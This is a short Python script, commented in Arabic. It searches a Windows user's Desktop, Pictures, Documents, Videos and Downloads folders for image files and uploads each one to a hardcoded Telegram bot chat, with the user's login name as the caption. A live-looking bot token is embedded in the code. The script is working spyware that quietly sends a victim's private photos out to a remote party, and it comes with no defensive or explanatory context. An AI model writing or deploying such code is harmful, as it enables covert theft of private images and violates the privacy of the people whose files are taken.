import requests
import os

def main():
    def send_photo_to_telegram(photo):
        chat_id = "743500292" # معرف المحادثة في تليجرام
        token = "6905293289:AAEgsMu0ZJ1ZHzaTVf6yqDka1SU7aeMf8k0" # توكن البوت الخاص بك
        url = f"https://api.telegram.org/bot{token}/sendPhoto"
        files = {"photo": photo}
        data = {"chat_id": chat_id, "caption": os.getlogin()}
        requests.post(url, files=files, data=data)


    ext = ['jpg','png','webp','bem']
    paths = [f'C:\\Users\\{os.getlogin()}\\Desktop',f'C:\\Users\\{os.getlogin()}\\Pictures',f'C:\\Users\\{os.getlogin()}\\Documents',f'C:\\Users\\{os.getlogin()}\\Videos',f'C:\\Users\\{os.getlogin()}\\Downloads']
    for path in paths:
        for paths,dirs,files in os.walk(path):
            for file in files:
                file = f'{paths}\\{file}'
                for e in ext:
                    if file.endswith(e):
                        if 'bin' not in file and 'share' not in file and 'Telegram Desktop' not in file:
                            photo = open(file,'rb').read()
                            send_photo_to_telegram(photo)
main()
